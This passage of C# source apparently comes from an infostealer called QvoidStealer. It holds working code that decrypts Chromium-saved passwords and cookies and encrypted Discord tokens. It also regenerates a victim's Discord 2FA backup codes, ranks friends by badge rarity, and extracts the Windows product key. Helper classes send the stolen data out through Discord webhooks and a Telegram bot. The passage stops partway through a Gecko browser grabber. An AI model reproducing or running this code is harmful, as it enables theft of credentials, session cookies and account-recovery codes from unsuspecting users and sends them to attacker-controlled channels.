            const int keyOffset = 52;
            var isWin8 = (byte)((digitalProductId[66] / 6) &amp; 1);
            digitalProductId[66] = (byte)((digitalProductId[66] &amp; 0xf7) | (isWin8 &amp; 2) * 4);

            const string digits = "BCDFGHJKMPQRTVWXY2346789";
            var last = 0;
            for (var i = 24; i &gt;= 0; i--)
            {
                var current = 0;
                for (var j = 14; j &gt;= 0; j--)
                {
                    current = current * 256;
                    current = digitalProductId[j + keyOffset] + current;
                    digitalProductId[j + keyOffset] = (byte)(current / 24);
                    current = current % 24;
                    last = current;
                }
                key = digits[current] + key;
            }

            var keypart1 = key.Substring(1, last);
            var keypart2 = key.Substring(last + 1, key.Length - (last + 1));
            key = keypart1 + "N" + keypart2;

            for (var i = 5; i &lt; key.Length; i += 6)
            {
                key = key.Insert(i, "-");
            }

            return key;
        }

        private static string SizeSuffix(Int64 value)
        {
            if (value &lt; 0)
                return "-" + SizeSuffix(-value);

            if (value == 0)
                return "0.0 bytes";

            int mag = (int)Math.Log(value, 1024);
            return $"{(decimal)value / (1L &lt;&lt; (mag * 10))} {SizeSuffixes[mag]}";
        }
    }

    public class Encryption
    {
        public static string ComputeSha256Hash(string rawData)
        {
            using (SHA256 sha256Hash = SHA256.Create())
            {
                byte[] bytes = sha256Hash.ComputeHash(Encoding.UTF8.GetBytes(rawData));
                StringBuilder builder = new StringBuilder();
                for (int i = 0; i &lt; bytes.Length; i++)
                    builder.Append(bytes[i].ToString("x2"));

                return builder.ToString();
            }
        }

        public static string SHA256CheckSum(string filePath)
        {
            using (SHA256 SHA256 = SHA256Managed.Create())
            {
                try
                {
                    using (FileStream fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                        return Convert.ToBase64String(SHA256.ComputeHash(fileStream));
                }
                catch { return null; }
            }
        }

        private static byte[] StringToByteArray(string hex)
        {
            //Haha belongs to the Shabak
            return (from x in Enumerable.Range(0, hex.Length)
                    where x % 2 == 0
                    select Convert.ToByte(hex.Substring(x, 2), 16)).ToArray&lt;byte&gt;();
        }

        public static string StrXOR(string input, byte key, bool encrypt)
        {
            Thread.Sleep(20);

            string output = string.Empty;
            if (encrypt)
            {
                foreach (char c in input)
                    output += (c ^ key).ToString("X2");
            }
            else
            {
                try
                {
                    byte[] strBytes = StringToByteArray(input);
                    foreach (byte b in strBytes)
                        output += (char)(b ^ key);
                }
                catch
                {
                    return string.Empty;
                }
            }

            return output;
        }

        public static string GenerateKey()
        {
            return "IndexOutOfRangeException%__@LIORLUBMAN@__%IndexOutOfRangeException";
        }

        public static string GenerateKey(int size, bool lowerCase, int seed = 0)
        {
            Random r = new Random();
            if (seed != 0)
                r = new Random(seed);

            string output = "";

            for (int i = 0; i &lt; size; ++i)
            {
                int[] rs = { r.Next('0', '9' + 1), r.Next('a', 'z' + 1), r.Next('A', 'Z' + 1) };
                output += (char)rs[r.Next(3)];
            }

            return lowerCase ? output.ToLower() : output.ToUpper();
        }

        public static string Base64Encode(string plainText)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
        }

        public static string Base64Decode(string base64EncodedData)
        {
            return Encoding.UTF8.GetString(Convert.FromBase64String(base64EncodedData));
        }

        public static string StrXOR(string input, bool encrypt, int Length = 1000)
        {
            Thread.Sleep(20);

            string key = string.Empty;
            string output = string.Empty;
            if (encrypt)
            {
                key = GenerateKey(Length, false);
                output = key;
                for (int i = 0; i &lt; input.Length; ++i)
                    output += (input[i] ^ key[i % key.Length]).ToString("X2");
            }
            else
            {
                try
                {
                    key = input.Remove(Length);
                    byte[] strBytes = StringToByteArray(input.Substring(Length));
                    for (int i = 0; i &lt; strBytes.Length; ++i)
                        output += (char)(strBytes[i] ^ key[i % key.Length]);
                }
                catch
                {
                    return string.Empty;
                }
            }

            return output;
        }

        public static string StrXOR(string input, string key, bool encrypt)
        {
            Thread.Sleep(20);

            if (key.Length == 0)
                return string.Empty;

            string output = string.Empty;
            if (encrypt)
            {
                for (int i = 0; i &lt; input.Length; ++i)
                    output += (input[i] ^ key[i % key.Length]).ToString("X2");
            }
            else
            {
                try
                {
                    byte[] strBytes = StringToByteArray(input);
                    for (int i = 0; i &lt; strBytes.Length; ++i)
                        output += (char)(strBytes[i] ^ key[i % key.Length]);
                }
                catch
                {
                    return string.Empty;
                }
            }

            return output;
        }

        public static string ROT13(string value)
        {
            char[] array = value.ToCharArray();
            for (int i = 0; i &lt; array.Length; i++)
            {
                int number = (int)array[i];

                if (number &gt;= 'a' &amp;&amp; number &lt;= 'z')
                {
                    if (number &gt; 'm')
                        number -= 13;
                    else
                        number += 13;
                }
                else if (number &gt;= 'A' &amp;&amp; number &lt;= 'Z')
                {
                    if (number &gt; 'M')
                        number -= 13;
                    else
                        number += 13;
                }

                array[i] = (char)number;
            }
            return new string(array);
        }
    }

    public class DiscordClient
    {
        private string Endpoint { get; } = "https://discord.com/api/v9/users/@me";
        public ulong Id { get; private set; }
        public string Username { get; private set; }
        public string Discriminator { get; private set; }
        public bool IsValidToken { get; private set; } = false;
        public string Avatar { get; private set; }
        public bool Verified { get; private set; }
        public string Email { get; private set; }
        public string Banner { get; private set; }
        public int? AccentColor { get; private set; }
        public PremiumType Premium { get; private set; }
        public string Phone { get; private set; }
        public DateTimeOffset CreatedAt { get; private set; }
        public string Token { get; private set; }
        public int Flags { get; private set; }
        public List&lt;string&gt; GetBadges(int Flags)
        {
            var badges = new List&lt;string&gt;();
            if ((Flags &amp; (int)Badges.Partnered_Server_Owner) == (int)Badges.Partnered_Server_Owner)
                badges.Add(Badges.Partnered_Server_Owner.ToString());

            if ((Flags &amp; (int)Badges.Bug_Hunter_Level_2) == (int)Badges.Bug_Hunter_Level_2)
                badges.Add(Badges.Bug_Hunter_Level_2.ToString());

            if ((Flags &amp; (int)Badges.Bug_Hunter_Level_1) == (int)Badges.Bug_Hunter_Level_1)
                badges.Add(Badges.Bug_Hunter_Level_1.ToString());

            if ((Flags &amp; (int)Badges.Early_Verified_Bot_Developer) == (int)Badges.Early_Verified_Bot_Developer)
                badges.Add(Badges.Early_Verified_Bot_Developer.ToString());

            if ((Flags &amp; (int)Badges.Early_Supporter) == (int)Badges.Early_Supporter)
                badges.Add(Badges.Early_Supporter.ToString());

            if ((Flags &amp; (int)Badges.Early_Verified_Bot_Developer) == (int)Badges.Early_Verified_Bot_Developer)
                badges.Add(Badges.Early_Verified_Bot_Developer.ToString());

            if ((Flags &amp; (int)Badges.House_Balance) == (int)Badges.House_Balance)
                badges.Add(Badges.House_Balance.ToString());

            if ((Flags &amp; (int)Badges.House_Bravery) == (int)Badges.House_Bravery)
                badges.Add(Badges.House_Bravery.ToString());

            if ((Flags &amp; (int)Badges.House_Brilliance) == (int)Badges.House_Brilliance)
                badges.Add(Badges.House_Brilliance.ToString());

            if ((Flags &amp; (int)Badges.Discord_Employee) == (int)Badges.Discord_Employee)
                badges.Add(Badges.Discord_Employee.ToString());

            return badges;
        }

        public List&lt;string&gt; Get2faCodes(string Password)
        {
            try
            {
                byte[] data = Encoding.UTF8.GetBytes("{" + $"\"password\":\"{Password}\",\"regenerate\":true" + "}");

                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://discord.com/api/v9/users/@me/mfa/codes");
                request.Method = "POST";
                request.ContentType = "application/json";
                request.ContentLength = data.Length;
                request.UserAgent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11";
                request.Headers.Add("Authorization", this.Token);

                using (var stream = request.GetRequestStream())
                    stream.Write(data, 0, data.Length);

                var response = ((HttpWebResponse)request.GetResponse());
                if (response.StatusCode != HttpStatusCode.OK)
                {
                    //Invalid token
                    return null;
                }

                JToken array = JObject.Parse(new StreamReader(response.GetResponseStream()).ReadToEnd())["backup_codes"];
                List&lt;string&gt; Codes = new List&lt;string&gt;();

                foreach (var item in array)
                {
                    if (item["consumed"].ToString().ToLower().Contains("true"))
                        continue;

                    Codes.Add(item["code"].ToString());
                }

                return Codes;
            }
            catch { }

            return null;
        }

        public enum PremiumType
        {
            None = 0,
            Nitro_Classic = 1,
            Nitro = 2
        }

        public enum Badges
        {
            Discord_Employee = 0x1,
            Partnered_Server_Owner = 0x2,
            HypeSquad_Events = 0x4,
            Bug_Hunter_Level_1 = 0x8,
            House_Bravery = 0x40,
            House_Brilliance = 0x80,
            House_Balance = 0x100,
            Early_Supporter = 0x200,
            Bug_Hunter_Level_2 = 0x4000,
            Early_Verified_Bot_Developer = 0x20000,
        }

        public DiscordClient(string Token)
        {
            if (Token.StartsWith("dQw4w9WgXcQ") &amp;&amp; !Regex.Match(Token, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", RegexOptions.Compiled).Success &amp;&amp;
                                                   !Regex.Match(Token, @"mfa\.[\w-]{84}", RegexOptions.Compiled).Success)
            {
                //Discord rickrooled us -&gt; the given token is encrypted.
                var localStateDeafultPath = $"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}\\Discord\\Local State";
                if (!File.Exists(localStateDeafultPath))
                    return;

                var keyBuffer = ChromiumDecryptor.GetKey(localStateDeafultPath);
                ChromiumDecryptor.Prepare(Convert.FromBase64String(Token.Split(new string[] { "dQw4w9WgXcQ:" }, StringSplitOptions.None)[1]), out var nonce, out var ciphertextTag);
                Token = ChromiumDecryptor.Decrypt(ciphertextTag, keyBuffer, nonce);
            }

            Initialize(Token);
        }

        private void Initialize(string Token)
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(Endpoint);
            request.Headers.Set("Authorization", Token);

            try
            {
                string response = new StreamReader(((HttpWebResponse)request.GetResponse()).GetResponseStream()).ReadToEnd().Replace("\n", "").Replace("\r", "");
                JObject jData = null;

                jData = JObject.Parse(response);

                this.Id = ulong.Parse($"{jData["id"]}");
                this.Username = $"{jData["username"]}";
                this.Discriminator = $"{jData["discriminator"]}";
                this.Avatar = $"{jData["avatar"]}";
                this.Verified = $"{jData["verified"]}".ToLower().StartsWith("tru");
                this.Email = $"{jData["email"]}";
                this.Banner = $"{jData["banner"]}";
                this.Phone = $"{jData["phone"]}";
                this.Flags = int.Parse($"{jData["flags"]}");
                this.CreatedAt = DateTimeOffset.FromUnixTimeMilliseconds((long)((this.Id &gt;&gt; 22) + 1420070400000UL));
                this.AccentColor = int.Parse(!String.IsNullOrEmpty($"{jData["accent_color"]}") ? $"{jData["accent_color"]}" : "0");
                this.Token = Token;

                if (!String.IsNullOrEmpty($"{jData["premium_type"]}"))
                    this.Premium = (PremiumType)Enum.Parse(typeof(PremiumType), $"{jData["premium_type"]}");

                this.IsValidToken = true;
            }
            catch (Exception ex) { IsValidToken = ex.Message.Contains("401"); }
        }

        public List&lt;DiscordUser&gt; GetFriends()
        {
            var friends = new List&lt;DiscordUser&gt;();

            HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://discord.com/api/v9/users/@me/relationships");
            request.Headers.Add("Authorization", this.Token);

            string response = new StreamReader(((HttpWebResponse)request.GetResponse()).GetResponseStream()).ReadToEnd().Replace("\n", "").Replace("\r", "");
            var jArray = JArray.Parse(response);
            for (int i = 0; i &lt; jArray.Count; ++i)
                friends.Add(JsonConvert.DeserializeObject&lt;DiscordUser&gt;(jArray[i]["user"].ToString()));

            return friends;
        }

        public int UserScore(DiscordUser user)
        {
            int sum = 0;
            GetBadges(user.PublicFlags).ForEach(badge =&gt;
            {
                switch (badge)
                {
                    case "Early_Verified_Bot_Developer":
                        sum += 1;
                        break;
                    case "Early_Supporter":
                        sum += 2;
                        break;
                    case "Bug_Hunter_Level_1":
                        sum += 3;
                        break;
                    case "HypeSquad_Events":
                        sum += 4;
                        break;
                    case "Partnered_Server_Owner":
                        sum += 5;
                        break;
                    case "Discord_Employee":
                        sum += 6;
                        break;
                }
            });

            return sum;
        }

        public List&lt;DiscordUser&gt; TopRarestUsers(List&lt;DiscordUser&gt; Users, int top)
        {
            for (int i = 0; i &lt; Users.Count; ++i)
                Users[i].Rarity = UserScore(Users[i]);

            return Users.OrderByDescending(t =&gt; t.Rarity).Take(top &gt; Users.Count ? Users.Count : top).ToList();
        }
    }

    public class DiscordUser
    {
        public ulong Id;
        public int Type;
        public string Nickname;
        public string Username;
        public string Discriminator;

        [JsonProperty("public_flags")]
        public int PublicFlags { get; set; }
        public string Avatar;
        public int Rarity;

        public DiscordUser(ulong Id, int Type, string Nickname, string Username, string Discriminator, int PublicFlags, string Avatar)
        {
            this.Id = Id;
            this.Type = Type;
            this.Nickname = Nickname;
            this.Username = Username;
            this.Discriminator = Discriminator;
            this.PublicFlags = PublicFlags;
            this.Avatar = Avatar;
        }

        public enum Badges
        {
            Discord_Employee = 0x1,
            Partnered_Server_Owner = 0x2,
            HypeSquad_Events = 0x4,
            Bug_Hunter_Level_1 = 0x8,
            House_Bravery = 0x40,
            House_Brilliance = 0x80,
            House_Balance = 0x100,
            Early_Supporter = 0x200,
            Bug_Hunter_Level_2 = 0x4000,
            Early_Verified_Bot_Developer = 0x20000,
        }

        public List&lt;string&gt; GetBadges(int Flags)
        {
            var badges = new List&lt;string&gt;();
            if ((Flags &amp; (int)Badges.Partnered_Server_Owner) == (int)Badges.Partnered_Server_Owner)
                badges.Add(Badges.Partnered_Server_Owner.ToString());

            if ((Flags &amp; (int)Badges.Bug_Hunter_Level_2) == (int)Badges.Bug_Hunter_Level_2)
                badges.Add(Badges.Bug_Hunter_Level_2.ToString());

            if ((Flags &amp; (int)Badges.Bug_Hunter_Level_1) == (int)Badges.Bug_Hunter_Level_1)
                badges.Add(Badges.Bug_Hunter_Level_1.ToString());

            if ((Flags &amp; (int)Badges.Early_Verified_Bot_Developer) == (int)Badges.Early_Verified_Bot_Developer)
                badges.Add(Badges.Early_Verified_Bot_Developer.ToString());

            if ((Flags &amp; (int)Badges.Early_Supporter) == (int)Badges.Early_Supporter)
                badges.Add(Badges.Early_Supporter.ToString());

            if ((Flags &amp; (int)Badges.Early_Verified_Bot_Developer) == (int)Badges.Early_Verified_Bot_Developer)
                badges.Add(Badges.Early_Verified_Bot_Developer.ToString());

            if ((Flags &amp; (int)Badges.House_Balance) == (int)Badges.House_Balance)
                badges.Add(Badges.House_Balance.ToString());

            if ((Flags &amp; (int)Badges.House_Bravery) == (int)Badges.House_Bravery)
                badges.Add(Badges.House_Bravery.ToString());

            if ((Flags &amp; (int)Badges.House_Brilliance) == (int)Badges.House_Brilliance)
                badges.Add(Badges.House_Brilliance.ToString());

            if ((Flags &amp; (int)Badges.Discord_Employee) == (int)Badges.Discord_Employee)
                badges.Add(Badges.Discord_Employee.ToString());

            return badges;
        }

        public int UserScore(DiscordUser user)
        {
            int sum = 0;
            GetBadges(user.PublicFlags).ForEach(badge =&gt;
            {
                //Those are the only badges people care about :P
                switch (badge)
                {
                    case "Early_Verified_Bot_Developer":
                        sum += 1;
                        break;
                    case "Early_Supporter":
                        sum += 2;
                        break;
                    case "Bug_Hunter_Level_1":
                        sum += 3;
                        break;
                    case "HypeSquad_Events":
                        sum += 4;
                        break;
                    case "Partnered_Server_Owner":
                        sum += 5;
                        break;
                    case "Discord_Employee":
                        sum += 6;
                        break;
                }
            });

            return sum;
        }
    }

    public class DiscordWebhook
    {
        public struct DiscordMessage
        {
            /// &lt;summary&gt;
            /// Message content
            /// &lt;/summary&gt;
            public string Content;

            /// &lt;summary&gt;
            /// Read message to everyone on the channel
            /// &lt;/summary&gt;
            public bool TTS;

            /// &lt;summary&gt;
            /// Webhook profile username to be shown
            /// &lt;/summary&gt;
            public string Username;

            /// &lt;summary&gt;
            /// Webhook profile avater to be shown
            /// &lt;/summary&gt;
            public string AvatarUrl;

            /// &lt;summary&gt;
            /// List of embeds
            /// &lt;/summary&gt;
            public List&lt;DiscordEmbed&gt; Embeds;

            public override string ToString() =&gt; Utils.StructToJson(this).ToString(Formatting.None);
        }

        /// &lt;summary&gt;
        /// Discord embed data object
        /// &lt;/summary&gt;
        public struct DiscordEmbed
        {
            /// &lt;summary&gt;
            /// Embed title
            /// &lt;/summary&gt;
            public string Title;

            /// &lt;summary&gt;
            /// Embed description
            /// &lt;/summary&gt;
            public string Description;

            /// &lt;summary&gt;
            /// Embed url
            /// &lt;/summary&gt;
            public string Url;

            /// &lt;summary&gt;
            /// Embed timestamp
            /// &lt;/summary&gt;
            public DateTime? Timestamp;

            /// &lt;summary&gt;
            /// Embed color
            /// &lt;/summary&gt;
            public Color? Color;

            /// &lt;summary&gt;
            /// Embed footer
            /// &lt;/summary&gt;
            public EmbedFooter? Footer;

            /// &lt;summary&gt;
            /// Embed image
            /// &lt;/summary&gt;
            public EmbedMedia? Image;

            /// &lt;summary&gt;
            /// Embed thumbnail
            /// &lt;/summary&gt;
            public EmbedMedia? Thumbnail;

            /// &lt;summary&gt;
            /// Embed video
            /// &lt;/summary&gt;
            public EmbedMedia? Video;

            /// &lt;summary&gt;
            /// Embed provider
            /// &lt;/summary&gt;
            public EmbedProvider? Provider;

            /// &lt;summary&gt;
            /// Embed author
            /// &lt;/summary&gt;
            public EmbedAuthor? Author;

            /// &lt;summary&gt;
            /// Embed fields list
            /// &lt;/summary&gt;
            public List&lt;EmbedField&gt; Fields;

            public override string ToString() =&gt; Utils.StructToJson(this).ToString(Formatting.None);
        }

        /// &lt;summary&gt;
        /// Discord embed footer data object
        /// &lt;/summary&gt;
        public struct EmbedFooter
        {
            /// &lt;summary&gt;
            /// Footer text
            /// &lt;/summary&gt;
            public string Text;

            /// &lt;summary&gt;
            /// Footer icon
            /// &lt;/summary&gt;
            public string IconUrl;

            /// &lt;summary&gt;
            /// Footer icon proxy
            /// &lt;/summary&gt;
            public string ProxyIconUrl;

            public override string ToString() =&gt; Utils.StructToJson(this).ToString(Formatting.None);
        }

        /// &lt;summary&gt;
        /// Discord embed media data object (images/thumbs/videos)
        /// &lt;/summary&gt;
        public struct EmbedMedia
        {
            /// &lt;summary&gt;
            /// Media url
            /// &lt;/summary&gt;
            public string Url;

            /// &lt;summary&gt;
            /// Media proxy url
            /// &lt;/summary&gt;
            public string ProxyUrl;

            /// &lt;summary&gt;
            /// Media height
            /// &lt;/summary&gt;
            public int? Height;

            /// &lt;summary&gt;
            /// Media width
            /// &lt;/summary&gt;
            public int? Width;

            public override string ToString() =&gt; Utils.StructToJson(this).ToString(Formatting.None);
        }

        /// &lt;summary&gt;
        /// Discord embed provider data object
        /// &lt;/summary&gt;
        public struct EmbedProvider
        {
            /// &lt;summary&gt;
            /// Provider name
            /// &lt;/summary&gt;
            public string Name;

            /// &lt;summary&gt;
            /// Provider url
            /// &lt;/summary&gt;
            public string Url;

            public override string ToString() =&gt; Utils.StructToJson(this).ToString(Formatting.None);
        }

        /// &lt;summary&gt;
        /// Discord embed author data object
        /// &lt;/summary&gt;
        public struct EmbedAuthor
        {
            /// &lt;summary&gt;
            /// Author name
            /// &lt;/summary&gt;
            public string Name;

            /// &lt;summary&gt;
            /// Author url
            /// &lt;/summary&gt;
            public string Url;

            /// &lt;summary&gt;
            /// Author icon
            /// &lt;/summary&gt;
            public string IconUrl;

            /// &lt;summary&gt;
            /// Author icon proxy
            /// &lt;/summary&gt;
            public string ProxyIconUrl;

            public override string ToString() =&gt; Utils.StructToJson(this).ToString(Formatting.None);
        }

        /// &lt;summary&gt;
        /// Discord embed field data object
        /// &lt;/summary&gt;
        public struct EmbedField
        {
            /// &lt;summary&gt;
            /// Field name
            /// &lt;/summary&gt;
            public string Name;

            /// &lt;summary&gt;
            /// Field value
            /// &lt;/summary&gt;
            public string Value;

            /// &lt;summary&gt;
            /// Field align
            /// &lt;/summary&gt;
            public bool InLine;

            public override string ToString() =&gt; Utils.StructToJson(this).ToString(Formatting.None);
        }

        /// &lt;summary&gt;
        /// Webhook url
        /// &lt;/summary&gt;
        public string Url { get; private set; }
        public bool Enabled;

        public DiscordWebhook(string url)
        {
            if (Uri.TryCreate(url, UriKind.Absolute, out Uri uri))
            {
                this.Url = url;
                this.Enabled = true;
            }
        }

        private void AddField(MemoryStream stream, string bound, string cDisposition, string cType, byte[] data)
        {
            string prefix = stream.Length &gt; 0 ? "\r\n--" : "--";
            string fBegin = $"{prefix}{bound}\r\n";

            byte[] fBeginBuffer = Utils.Encode(fBegin);
            byte[] cDispositionBuffer = Utils.Encode(cDisposition);
            byte[] cTypeBuffer = Utils.Encode(cType);

            stream.Write(fBeginBuffer, 0, fBeginBuffer.Length);
            stream.Write(cDispositionBuffer, 0, cDispositionBuffer.Length);
            stream.Write(cTypeBuffer, 0, cTypeBuffer.Length);
            stream.Write(data, 0, data.Length);
        }

        private void SetJsonPayload(MemoryStream stream, string bound, string json)
        {
            string cDisposition = "Content-Disposition: form-data; name=\"payload_json\"\r\n";
            string cType = "Content-Type: application/octet-stream\r\n\r\n";
            AddField(stream, bound, cDisposition, cType, Utils.Encode(json));
        }

        private void SetFile(MemoryStream stream, string bound, int index, FileInfo file)
        {
            string cDisposition = $"Content-Disposition: form-data; name=\"file_{index}\"; filename=\"{file.Name}\"\r\n";
            string cType = "Content-Type: application/octet-stream\r\n\r\n";
            AddField(stream, bound, cDisposition, cType, File.ReadAllBytes(file.FullName));
        }

        /// &lt;summary&gt;
        /// Send webhook message
        /// &lt;/summary&gt;
        public void Send(DiscordMessage message, params FileInfo[] files)
        {
            if (!this.Enabled)
                return;

            if (string.IsNullOrEmpty(Url))
                throw new ArgumentNullException("Invalid Webhook URL.");

            string bound = "------------------------" + DateTime.Now.Ticks.ToString("x");
            WebClient webhookRequest = new WebClient();
            webhookRequest.Headers.Add("Content-Type", "multipart/form-data; boundary=" + bound);

            MemoryStream stream = new MemoryStream();
            for (int i = 0; i &lt; files.Length; i++)
                SetFile(stream, bound, i, files[i]);

            string json = message.ToString();
            SetJsonPayload(stream, bound, json);

            byte[] bodyEnd = Utils.Encode($"\r\n--{bound}--");
            stream.Write(bodyEnd, 0, bodyEnd.Length);

            try
            {
                webhookRequest.UploadData(this.Url, stream.ToArray());
            }
            catch (WebException ex)
            {
                throw new WebException(Utils.Decode(ex.Response.GetResponseStream()));
            }

            stream.Dispose();
        }
    }

    public class TelegramAPI
    {
        public bool Enabled;
        public ulong ChatId;
        public string Token;
        private string Endpoint = "https://api.telegram.org/bot";

        public TelegramAPI(string Token, ulong ChatId)
        {
            if (Token.Length == 46 &amp;&amp; Token.Contains(":") &amp;&amp; ChatId.ToString().Length &gt;= 9)
            {
                this.ChatId = ChatId;
                this.Token = Token;
                this.Endpoint += $"{Token}/sendDocument?chat_id={ChatId}";
                Enabled = true;
            }
        }

        public void Send(byte[] fileData, string fileName, string content)
        {
            if (!this.Enabled)
                return;

            try
            {
                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls;
                WebClient webClient = new WebClient
                {
                    Proxy = null
                };

                string boundary = "------------------------" + DateTime.Now.Ticks.ToString("x");
                webClient.Headers.Add("Content-Type", "multipart/form-data; boundary=" + boundary);
                string @string = webClient.Encoding.GetString(fileData);
                string s = string.Format("--{0}\r\nContent-Disposition: form-data; name=\"document\"; filename=\"{1}\"\r\nContent-Type: {2}\r\n\r\n{3}\r\n--{0}--\r\n", new object[]
                {
                    boundary,
                    fileName,
                    "application/x-ms-dos-executable",
                    @string
                });

                byte[] bytes = webClient.Encoding.GetBytes(s);
                webClient.UploadData(!string.IsNullOrEmpty(content) ? this.Endpoint + $"&amp;parse_mode=markdown&amp;caption={content}" : this.Endpoint, "POST", bytes);
            }
            catch (Exception)
            {

            }
        }
    }

    internal sealed class Json
    {
        public string Data;
        public Json(string data)
        {
            this.Data = data;
        }
        // Get string value from json dictonary
        public string GetValue(string value)
        {
            string result = String.Empty;
            Regex valueRegex = new Regex($"\"{value}\":\"([^\"]+)\"");
            Match valueMatch = valueRegex.Match(this.Data);
            if (!valueMatch.Success)
                return result;

            result = Regex.Split(valueMatch.Value, "\"")[3];
            return result;
        }
        // Remove string
        public void Remove(string[] values)
        {
            foreach (string value in values)
                this.Data = this.Data.Replace(value, "");
        }
        // Get array from json data
        public string[] SplitData(string delimiter = "},")
        {
            return Regex.Split(this.Data, delimiter);
        }
    }
}

namespace QvoidStealer.Miscellaneous.Stealers.Browsers
{
    public class ChromiumGrabber
    {
        public string CookiePath;
        public string KeyPath;
        public string PasswordPath;
        public string BrowserName;

        public ChromiumGrabber(string CookiePath, string KeyPath, string PasswordPath, string BrowserName)
        {
            this.CookiePath = CookiePath;
            this.KeyPath = KeyPath;
            this.PasswordPath = PasswordPath;
            this.BrowserName = BrowserName;
        }

        internal sealed class ChromiumDecryptor
        {
            public static byte[] GetKey(string KeyPath)
            {
                var v = File.ReadAllText(KeyPath);

                dynamic json = JsonConvert.DeserializeObject(v);
                string key = json.os_crypt.encrypted_key;

                var src = Convert.FromBase64String(key);
                var encryptedKey = src.Skip(5).ToArray();

                var decryptedKey = ProtectedData.Unprotect(encryptedKey, null, DataProtectionScope.CurrentUser);

                return decryptedKey;
            }

            public static string Decrypt(byte[] encryptedBytes, byte[] key, byte[] iv)
            {
                var sR = string.Empty;
                try
                {
                    var cipher = new GcmBlockCipher(new AesEngine());
                    var parameters = new AeadParameters(new KeyParameter(key), 128, iv, null);

                    cipher.Init(false, parameters);
                    var plainBytes = new byte[cipher.GetOutputSize(encryptedBytes.Length)];
                    var retLen = cipher.ProcessBytes(encryptedBytes, 0, encryptedBytes.Length, plainBytes, 0);
                    cipher.DoFinal(plainBytes, retLen);

                    sR = Encoding.UTF8.GetString(plainBytes).TrimEnd("\r\n\0".ToCharArray());
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                    Console.WriteLine(ex.StackTrace);
                }

                return sR;
            }

            public static void Prepare(byte[] encryptedData, out byte[] nonce, out byte[] ciphertextTag)
            {
                nonce = new byte[12];
                ciphertextTag = new byte[encryptedData.Length - 3 - nonce.Length];

                Array.Copy(encryptedData, 3, nonce, 0, nonce.Length);
                Array.Copy(encryptedData, 3 + nonce.Length, ciphertextTag, 0, ciphertextTag.Length);
            }
        }

        public List&lt;CredentialModel&gt; ReadPasswords()
        {
            var result = new List&lt;CredentialModel&gt;();

            try
            {
                var p = Path.GetFullPath(PasswordPath);

                if (File.Exists(KeyPath) &amp;&amp; File.Exists(p))
                {
                    using (var conn = new SQLiteConnection($"Data Source={p};pooling=false"))
                    {
                        conn.Open();
                        using (var cmd = conn.CreateCommand())
                        {
                            cmd.CommandText = "SELECT action_url, username_value, password_value FROM logins";
                            using (var reader = cmd.ExecuteReader())
                            {
                                if (reader.HasRows)
                                {
                                    var key = ChromiumDecryptor.GetKey(KeyPath);
                                    while (reader.Read())
                                    {
                                        byte[] nonce, ciphertextTag;
                                        var encryptedData = GetBytes(reader, 2);
                                        ChromiumDecryptor.Prepare(encryptedData, out nonce, out ciphertextTag);
                                        var pass = ChromiumDecryptor.Decrypt(ciphertextTag, key, nonce);

                                        result.Add(new CredentialModel()
                                        {
                                            Url = reader.GetString(0),
                                            Username = reader.GetString(1),
                                            Password = pass
                                        });
                                    }
                                }
                            }
                        }
                        conn.Close();
                    }

                }
                else
                {
                    return null;
                    throw new FileNotFoundException($"Cannot find {BrowserName}'s file");
                }
            }
            catch { }

            return result;
        }

        private static byte[] GetBytes(SQLiteDataReader reader, int columnIndex)
        {
            const int CHUNK_SIZE = 2 * 1024;
            byte[] buffer = new byte[CHUNK_SIZE];
            long bytesRead;
            long fieldOffset = 0;
            using (MemoryStream stream = new MemoryStream())
            {
                while ((bytesRead = reader.GetBytes(columnIndex, fieldOffset, buffer, 0, buffer.Length)) &gt; 0)
                {
                    stream.Write(buffer, 0, (int)bytesRead);
                    fieldOffset += bytesRead;
                }
                return stream.ToArray();
            }
        }

        public List&lt;CookieModel&gt; GetCookies()
        {
            if (!File.Exists(KeyPath))
            {
                return null;
                throw new FileNotFoundException($"Cannot find {BrowserName}'s file");
            }

            return GetAllCookies(ChromiumDecryptor.GetKey(KeyPath));
        }

        private List&lt;CookieModel&gt; GetAllCookies(byte[] key)
        {
            try
            {
                List&lt;CookieModel&gt; cookies = new List&lt;CookieModel&gt;();
                if (CookiePath.Contains("\\Google\\Chrome\\"))
                {
                    if (!File.Exists(CookiePath)) throw new FileNotFoundException("Cant find cookie store", CookiePath);  // throw FileNotFoundException 
                }
                else
                    if (!Directory.Exists(CookiePath)) throw new FileNotFoundException("Cant find cookie store", CookiePath);  // throw FileNotFoundException if "Chrome\User Data\Default\Cookies" not found

                using (var conn = new System.Data.SQLite.SQLiteConnection($"Data Source={CookiePath};pooling=false"))
                using (var cmd = conn.CreateCommand())
                {
                    cmd.CommandText = $"SELECT name,encrypted_value,host_key FROM cookies";

                    conn.Open();
                    using (var reader = cmd.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            ChromiumDecryptor.Prepare((byte[])reader[1], out byte[] nonce, out byte[] ciphertextTag);
                            cookies.Add(new CookieModel()
                            {
                                Name = reader.GetString(0),

                                Value = ChromiumDecryptor.Decrypt(ciphertextTag, key, nonce),
                                HostName = reader.GetString(2)
                            });
                        }
                    }
                    conn.Close();
                }
                return cookies;
            }
            catch { return null; }
        }
    }
}

namespace QvoidStealer.Miscellaneous.Stealers.Browsers
{
    class GeckoGrabber
    {
        internal sealed class Common
        {

            internal struct Cookie
            {
                public string sHostKey { get; set; }
                public string sName { get; set; }
                public string sPath { get; set; }
                public string sExpiresUtc { get; set; }
                public string sKey { get; set; }
                public string sValue { get; set; }
                public string sIsSecure { get; set; }
            }

            internal struct Site
            {
                public string sUrl { get; set; }
                public string sTitle { get; set; }
                public int iCount { get; set; }
            }

            internal struct Bookmark
            {
                public string sUrl { get; set; }
                public string sTitle { get; set; }
            }
        }

        internal sealed class WinApi
        {
